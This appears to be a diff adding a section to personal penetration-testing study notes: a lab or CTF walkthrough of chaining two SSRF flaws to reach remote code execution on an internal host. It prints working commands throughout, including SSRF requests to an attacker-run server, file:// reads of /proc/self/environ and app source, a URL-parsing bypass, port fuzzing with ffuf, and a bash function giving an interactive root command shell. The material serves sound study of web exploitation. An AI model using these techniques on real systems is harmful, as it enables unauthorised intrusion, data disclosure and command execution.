@@ -191,3 +191,205 @@ fuzzing can be extended to parts of the HTTP-request like the `User-Agent` to he
 
 ## SSRF Exploitation Example 
 
+with our target we can work to exploit multiple SSRF vulnerabilities to gain RCE on an internal host with the following attack chain: 
+
+pentester -> exercise-target SSRF -> internal webserver SSRF -> localhost webapp -> RCE 
+
+basic recon on our target shows 3 open ports: 
+
+![](Images/Pasted%20image%2020240212145435.png)
+
+now lets do a silent curl request to get the protocol response headers 
+
+`curl -i -s http://target`
+
+![](Images/Pasted%20image%2020240212145536.png)
+
+from this we can see that the request redirected to `/load?q=index.html` meaning that the `q` parameter fetches the resource `index.html` 
+
+now lets try to follow the redirect with `-L`: 
+
+![](Images/Pasted%20image%2020240212145716.png)
+
+now we can see `ubuntu-web.lalaguna.local` and `internet.app.local` which are apps on the internal network (inaccessible from our current position)
+
+now we want to see if the `q` parameter is open to SSRF, and if it is we may be able to reach the `internal.app.local` web app   
+"may" because a trust relationship between `ubuntu-web` and `internal.app.local` likely exists   
+this type of relationship can be something like a firewall rule or lack of a firewall rule
+
+lets start by listening on port 8080: 
+
+![](Images/Pasted%20image%2020240212155955.png)
+
+then we can issue a request to the target web app with `http://<VPN/TUN adapter IP>` instead of `index.html` in the `q` parameter 
+
+![](Images/Pasted%20image%2020240212160347.png)
+
+we can see the response of a request issued by the target server using python-urllib on our netcat listener: 
+
+![](Images/Pasted%20image%2020240212160335.png)
+
+`python-urllib` supports `file`, `http`, and `ftp` schemas, so we can read local files via the `file` schema and remote files using `ftp` 
+
+we can test the functionality by completing a few steps 
+
+first we create a file called `index.html` 
+
+```html
+<html>
+</body>
+<a>SSRF</a>
+<body>
+<html>
+```
+
+then in the same directory we start an HTTP server using `python3 -m http.server 9090`: 
+
+![](Images/Pasted%20image%2020240212160847.png)
+
+then again in the same directory start an FTP server with: 
+
+```shell
+sudo pip3 install twisted
+sudo python3 -m twisted ftp -p 21 -r .
+```
+
+![](Images/Pasted%20image%2020240212161124.png)
+
+retrieve `index.html` through FTP:
+
+`curl -i -s "http://<target>/load?q=ftp://<VPN/TUN adapter IP>/index.html`
+
+![](Images/Pasted%20image%2020240212161734.png)
+
+you can also retrieve `index.html` through the target app using http: 
+
+`curl -i -s "http://<target>/load?q=http://10.10.15.54:9090/index.html`
+
+![](Images/Pasted%20image%2020240212161228.png)
+
+then you can retrieve local files through the target app with the file schema: 
+
+![](Images/Pasted%20image%2020240212161329.png)
+
+fetching these remote HTML files can lead to reflected XSS 
+
+we've only seen two open ports on the target server but there is a possibility of internal apps existing and listening only on localhost   
+
+we can use ffuf to fuzz for internal apps
+
+first we can generate a wordlist containing all possible ports with: 
+
+`for port in {1..65535}; do echo $port >> ports.txt;done`
+
+issue a request to a random port to get the response size of a request for a false or non-existent service: 
+
+`curl -i -s "http://<target>/load?q=http://127.0.0.1:1` 
+
+![](Images/Pasted%20image%2020240212171333.png)
+
+use ffuf with the wordlist and filter the responses by size: 
+
+![](Images/Pasted%20image%2020240212171524.png)
+
+we can see that port 5000 is another listening app: 
+
+![](Images/Pasted%20image%2020240212172234.png)
+
+we can now send a request to the port: 
+
+![](Images/Pasted%20image%2020240212172820.png)
+
+now to hopefully achieve RCE we can start by issuing a curl request to the internal app that we discovered previously: 
+
+`curl -i -s "http://<target>/load?q=http://internal.app.local/load?q=index.html"`
+
+![](Images/Pasted%20image%2020240212173201.png)
+
+we can again find any web apps listening on the localhost, lets first issue a request to a random port to see how closed port responses look: 
+
+`curl -i -s "http://<target>/load?q=http://internal.app.local/load?q=http://127.0.0.1:1"`
+
+![](Images/Pasted%20image%2020240212173450.png)
+
+we got `unknown url type` which means that the web app appears to be removing `://` from our request which we can get around by manipulating the url: 
+
+`curl -i -s "http://<target>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:1"`
+
+![](Images/Pasted%20image%2020240212173641.png)
+
+now we get a connection response but it includes content based on the resource we are trying to fetch, so if we used this size of the response it wouldn't filter much out  
+instead we can use regex for filtering: 
+
+`ffuf -w ./ports.txt:PORT -u "http://<target>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:PORT" -fr 'Errno[[:blank:]]111'`
+
+![](Images/Pasted%20image%2020240212174152.png)
+
+again we have found an application listening on port 5000
+
+we can use the same tactics of sending a request to the 3rd app: 
+
+`curl -i -s "http://<target>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/`
+
+![](Images/Pasted%20image%2020240212174426.png)
+
+we have now successfully accomplished: 
+- issue requests on behalf of ubuntu-web to internal.app.local
+- reach a web app listening on port 5000 inside of internal.app.local, chaining two SSRF vulnerabilities 
+- disclose a list of files via the internal app 
+
+now we can use the files to uncover source code to see how we might achieve RCE 
+
+lets issue a request to disclose `/proc/self/environ` where the current path should be present under the `PWD` env variable: 
+
+`curl -i -s "http://<target>/load?q=http://internal.app.local/load?q=file:://///proc/self/environ" -o -`
+
+![](Images/Pasted%20image%2020240212174819.png)
+
+we can see from the response that `PWD=/app` and there is a list of interesting files, lets look at `internal_local.py`: 
+
+`curl -i -s "http://<target>/load?q=http://internal.app.local/load?q=file:://///app/internal_local.py"`
+
+![](Images/Pasted%20image%2020240212180129.png)
+
+looking at the code we can see functionality that lets us execute commands on the remote host by sending a GET request to `/runme?x=<cmd>`
+
+lets try with: 
+
+`curl -i -s "http://<target>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=whoami"`
+
+![](Images/Pasted%20image%2020240212180510.png)
+
+from this we can see that we are the root user and we can execute commands, but what if we submit a command with arguments like: 
+
+`runme?x=uname -a`
+
+![](Images/Pasted%20image%2020240212180702.png)
+
+because we are going through 3 applications, we will need to encode our special characters 3 times, like we did with the `http::////` 
+
+can install jq to help encode: 
+
+```shell
+sudo apt-get install jq
+echo "encode me" | jq -sRr @uri
+```
+
+then we can make a bash function to automate executing commands on the target app: 
+
+```bash
+function rce() {
+function> while true; do
+function while> echo -n "# "; read cmd
+function while> ecmd=$(echo -n $cmd | jq -sRr @uri | jq -sRr @uri | jq -sRr @uri)
+function while> curl -s -o - "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=${ecmd}"
+function while> echo ""
+function while> done
+function> }
+```
+
+then use `rce` to run or use encoder to find flag
+
+![](Images/Pasted%20image%2020240212192951.png)
+
+
